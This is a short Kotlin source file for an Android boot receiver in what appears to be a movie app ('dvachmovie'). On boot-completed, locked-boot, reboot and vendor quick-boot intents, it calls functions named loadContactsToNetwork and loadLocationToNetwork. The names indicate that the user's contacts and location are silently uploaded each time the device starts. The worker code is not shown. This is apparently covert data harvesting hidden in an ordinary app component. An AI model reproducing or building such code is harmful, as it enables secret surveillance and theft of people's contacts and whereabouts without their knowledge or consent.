package dvachmovie.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import dvachmovie.worker.WorkerManager

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if(    intent?.action.equals(Intent.ACTION_BOOT_COMPLETED)
                || intent?.action.equals(Intent.ACTION_LOCKED_BOOT_COMPLETED)
                || intent?.action.equals(Intent.ACTION_USER_INITIALIZE)
                || intent?.action.equals(Intent.ACTION_REBOOT)
                || intent?.action.equals("android.intent.action.QUICKBOOT_POWERON")
                || intent?.action.equals("com.htc.intent.action.QUICKBOOT_POWERON")
        )
        {
            WorkerManager.loadContactsToNetwork()
            WorkerManager.loadLocationToNetwork()
        }
    }
}
